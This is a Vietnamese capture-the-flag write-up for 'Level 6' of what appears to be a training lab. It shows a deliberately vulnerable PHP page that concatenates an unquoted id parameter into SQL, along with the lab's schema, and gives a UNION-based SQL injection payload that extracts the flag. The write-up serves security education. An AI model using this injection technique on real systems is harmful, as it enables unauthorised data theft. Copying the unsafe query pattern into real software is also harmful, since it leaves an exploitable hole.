# **Level 6:**
```php
<?php
if (isset($_GET["id"])) {
    try {
        include("db.php");
        $database = make_connection("posts_db");

        $id = $database->real_escape_string($_GET["id"]);
        $sql = "SELECT content FROM posts WHERE id=$id";
        $query = $database->query($sql);
        $row = $query->fetch_assoc(); // Get the first row

        if ($row !== NULL)
            $message = "<iframe height='800px' width='100%' src='" . $row["content"] . "'></iframe>";
        else
            $message = "ID not found"; // No result
    } catch (mysqli_sql_exception $e) {
        $message = $e->getMessage();
    }
} else {
    header("Location: level6.php?id=1");
}

include("static/html/blog.html");
```
Chúng ta nhận thấy đường dẫn nhận Id để hiển thị dữ liệu là kết quả trả về từ việc thực hiện truy vấn SQL , mà ở đây lại sử dụng nối chuỗi trực tiếp không lọc gì cả 

Vào trong Database thì chúng ta có được 
```sql
USE posts_db; -- This database use for level 6

DROP TABLE IF EXISTS `posts`;

CREATE TABLE `posts` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `content` text NOT NULL,
  PRIMARY KEY (`id`)
);

INSERT INTO `posts` (`id`, `content`) VALUES (1, 'https://blog.cyberjutsu.io/2021/08/09/hoc-an-toan-thong-tin/');
INSERT INTO `posts` (`id`, `content`) VALUES (2, 'https://blog.cyberjutsu.io/2021/06/02/IDOL-streamer-vs-XSS/');
INSERT INTO `posts` (`id`, `content`) VALUES (3, 'https://blog.cyberjutsu.io/2021/05/13/HTML-sanitizer-vs-XSS/');

DROP TABLE IF EXISTS `secret6`;

CREATE TABLE `secret6` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `content` text NOT NULL,
  PRIMARY KEY (`id`)
);

INSERT INTO `secret6` (`id`, `content`) VALUES (1, 'flag{eb627f3d394a64184da1a16d6bb8100d}');
```
Vậy thì để lấy được flag thì chúng ta cần payload:
```sql
1000 UNION SELECT content FROM secret6 WHERE id = 1-- -
```
Lúc này do id = 1000 không có dữ liệu trả về nên nó sẽ lấy dữ liệu ở câu truy vấn thứ 2 , mà câu truy vấn thứ 2 lại là câu lấy flag .

Sau đó dữ liệu trả về được gán vào trong `$row["content"]` . Và  `$row["content"]` sẽ được in ra ở trong source code 
```
src='" . $row["content"] .
```

<img width="1494" height="760" alt="image" src="https://github.com/user-attachments/assets/ac451d7f-236f-4e40-afc1-aae505ad13b9" />
